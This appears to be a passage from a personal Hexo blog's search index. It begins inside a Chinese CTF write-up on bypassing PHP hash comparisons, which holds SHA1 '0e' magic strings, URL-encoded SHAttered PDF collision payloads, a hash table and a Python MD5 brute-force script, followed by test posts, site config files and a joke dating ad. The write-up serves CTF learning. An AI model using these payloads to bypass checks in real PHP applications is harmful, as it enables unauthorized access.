%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</p><p>数据大抵是没有问题的，出错可以试着检查下是否支持 url 编码，这里点名 绿色 hackbar，感觉直接传 url 编码的参数总会报错。打 web 做这种题一定要用 burpsuite 传参，鬼知道出什么问题，，有能力的可以 python 写 request</p><h1 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h1><h2 id="sha1-后-0e-数字-sha1-a-sha1-b"><a href="#sha1-后-0e-数字-sha1-a-sha1-b" class="headerlink" title="sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)"></a>sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)</h2><p>aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m<br>f2WfQ iv2Cn</p><h2 id="sha1-强相等碰撞-sha1-a-sha1-b"><a href="#sha1-强相等碰撞-sha1-a-sha1-b" class="headerlink" title="sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)"></a>sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)</h2><p>array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1<br>&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><h2 id="sha1-后等于自己"><a href="#sha1-后等于自己" class="headerlink" title="sha1 后等于自己"></a>sha1 后等于自己</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">              text                                            SHA1 Hash</span><br><span class="line">0e00000000000000000000081614617300000000 ==&gt; 0e65307525940999632287492285468259219070</span><br><span class="line">0e00000000000000000000721902017120000000 ==&gt; 0e94981159498252295418182453841140483274</span><br><span class="line">0e01011001101011010001101110101100101000 ==&gt; 0e48906523151976751117677463787111106598</span><br><span class="line">0e11001000001010011000100000010001101000 ==&gt; 0e63407184960930419027062777705081379452</span><br><span class="line">0e01000001100000001010011011001000000100 ==&gt; 0e55962072388397083814346733718698213796</span><br><span class="line">0e10011110000101101000011101011010100100 ==&gt; 0e31188585417285828785355336774237712792</span><br><span class="line">0e01010111000111111010101011010111010100 ==&gt; 0e45906344569616659428808892091261969181</span><br><span class="line">0e00100001110000001111010000010011101100 ==&gt; 0e14860258669052332549568607710438132953</span><br><span class="line">0e11110000111010001001101111111110010010 ==&gt; 0e12174258436385758552874426941686538483</span><br><span class="line">0e10111110011100101100010101111010000110 ==&gt; 0e99774398282593376043462038572281385389</span><br><span class="line">0e11001111110111110010111010000011110110 ==&gt; 0e63185221301034624940345471074357888797</span><br><span class="line">0e00001010010101100100101011101110001110 ==&gt; 0e90943988772171749054413593888105986782</span><br><span class="line">0e01011101110010111011110010010010101110 ==&gt; 0e01608800192659803576771346607441737826</span><br><span class="line">0e10111110101111001000000100011101101110 ==&gt; 0e49094541458479495263034294421025186938</span><br><span class="line">0e11100111101110011010111001010101111110 ==&gt; 0e55770706149948760086200713505841887543</span><br><span class="line">0e11111001010101100110011001010001110001 ==&gt; 0e91120687121163809515824135435029958137</span><br><span class="line">0e01000111101111110010010010000001001001 ==&gt; 0e78071797328546369301825420848872451849</span><br><span class="line">0e00100110100010100110001101110110110101 ==&gt; 0e06077380408260614659219920561082767632</span><br><span class="line">0e11111100001011000011110100100010111101 ==&gt; 0e12149120354415335220758399492713921588</span><br><span class="line">0e00111100110101101001000101011011111101 ==&gt; 0e38661126569790555598431905065403870516</span><br><span class="line">0e10100011100101000001110010100110100011 ==&gt; 0e55745078154640212511596259055910278070</span><br><span class="line">0e10011110011111001001100100000111011011 ==&gt; 0e20319731123101477913295720812414482217</span><br></pre></td></tr></table></figure><h1 id="自己爆破用脚本"><a href="#自己爆破用脚本" class="headerlink" title="自己爆破用脚本"></a>自己爆破用脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查MD5哈希值是否以0e开头并且后面跟随纯数字&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> md5_hash.startswith(<span class="string">&quot;0e&quot;</span>) <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_valid_a</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力求解a，使得md5(a)和md5(md5(a))都满足条件&quot;&quot;&quot;</span></span><br><span class="line">    chars = (</span><br><span class="line">        string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    )  <span class="comment"># 允许的字符集</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 控制a的长度</span></span><br><span class="line">        <span class="built_in">print</span>(length)</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            a = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_a = hashlib.md5(a.encode()).hexdigest()</span><br><span class="line">            md5_md5_a = hashlib.md5(md5_a.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> is_valid_md5(md5_a) <span class="keyword">and</span> is_valid_md5(md5_md5_a):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found a: <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(a): <span class="subst">&#123;md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(md5(a)): <span class="subst">&#123;md5_md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行暴力求解</span></span><br><span class="line">find_valid_a()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="说在后面"><a href="#说在后面" class="headerlink" title="说在后面"></a>说在后面</h1><p>我在一开始学习 MD5 绕过时吃了很多亏。还是被勾币出题人拷打少了，导致很多打只能自己硬咽下去。这是博客的一篇文章，在写之时深深感慨自己在茫茫搜索 MD5 时的无力，到自己写时，大大弥补加了很多自己当时搜索时的关键词，希望有点帮助吧。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/posts/d87f7e0c.html"/>
      <url>/posts/d87f7e0c.html</url>
      
        <content type="html"><![CDATA[<p>不要学我熬夜做东西。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Markdown格式测试</title>
      <link href="/posts/db60f10c.html"/>
      <url>/posts/db60f10c.html</url>
      
        <content type="html"><![CDATA[<h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><p>正文这么打</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> this is terminal <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p><a href="https://hexo.io/">这是超链接</a></p><p><a href="https://www.baidu.com/">https://www.baidu.com</a><br><img src="http://www.wazhishi.com/uploads/allimg/240328/0K453B43-0.jpg"><br>不论怎么讲，会战兵力是八十万对六十万，优势在我</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/package.json"/>
      <url>/package.json</url>
      
        <content type="html"><![CDATA[{"name":"hexo-site","version":"0.0.0","private":true,"scripts":{"build":"hexo generate","clean":"hexo clean","deploy":"hexo deploy","server":"hexo server","netlify":"npm run clean && npm run build"},"hexo":{"version":"7.3.0"},"type":"module","dependencies":{"gitalk":"^1.8.0","gulp":"^5.0.0","gulp-htmlmin":"^5.0.1","hexo":"^7.3.0","hexo-abbrlink":"^2.2.1","hexo-browsersync":"^0.3.0","hexo-deployer-git":"^4.0.0","hexo-douban":"^2.3.6","hexo-generator-archive":"^2.0.0","hexo-generator-category":"^2.0.0","hexo-generator-feed":"^3.0.0","hexo-generator-index":"^4.0.0","hexo-generator-search":"^2.4.3","hexo-generator-sitemap":"^3.0.1","hexo-generator-tag":"^2.0.0","hexo-renderer-ejs":"^2.0.0","hexo-renderer-jade":"^0.5.0","hexo-renderer-marked":"^6.3.0","hexo-renderer-stylus":"^3.0.1","hexo-server":"^3.0.0","hexo-theme-butterfly":"^4.13.0","hexo-theme-landscape":"^1.0.0","hexo-wordcount":"^6.0.1","workbox-build":"^7.1.1"},"devDependencies":{"@babel/core":"^7.25.2","@babel/preset-env":"^7.25.4","gulp-babel":"^8.0.0","gulp-clean-css":"^4.3.0","gulp-fontmin":"^0.7.4","gulp-htmlclean":"^2.7.22","gulp-imagemin":"^9.1.0","gulp-terser":"^2.1.0"}}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"hatchet的个人博客","short_name":"hatchet的个人博客","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/site-icons/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/site-icons/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/site-icons/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/site-icons/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/site-icons/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/site-icons/256.png","sizes":"256x256","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>朋友的相亲信息</p><p>相亲启事</p><p>本人简介： 男，32 岁，身高 175cm，体重 70kg，性格温和，开朗大方。现居成都，从事互联网行业，工作稳定，收入可观。爱好运动、旅行、读书，平时也喜欢研究美食，享受生活中的点滴乐趣。朋友评价我是一个责任感强、懂得关心他人的人。</p><p>对未来伴侣的期望： 希望能找到一位性格开朗、善解人意、积极向上的女孩，年龄在 26-32 岁之间，身高 160cm 以上，身体健康，生活态度积极。希望她有稳定的工作和自己的兴趣爱好，能够在生活中彼此支持、共同成长。</p><p>婚姻观念： 我认为婚姻是一辈子的承诺，建立在彼此理解、尊重和包容的基础上。希望在今后的日子里，能与伴侣携手并肩，一起经历生活中的风雨和阳光，建立一个温馨、幸福的小家庭。</p><p>如果你也期待一段真挚、长久的感情，欢迎与我联系，一起创造属于我们的美好未来。</p><p>联系方式： 微信：xxxxxx 电话：xxxxxx</p><p>期待你的到来！<br><img src="/img/about/xq_1.jpg"><br><img src="/img/about/xq_2.jpg"><br><img src="/img/about/xq_3.jpg"><br><img src="/img/about/xq_4.jpg"><br><img src="/img/about/xq_5.jpg"><br>（纯属娱乐，如有雷同，请勿当真）</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
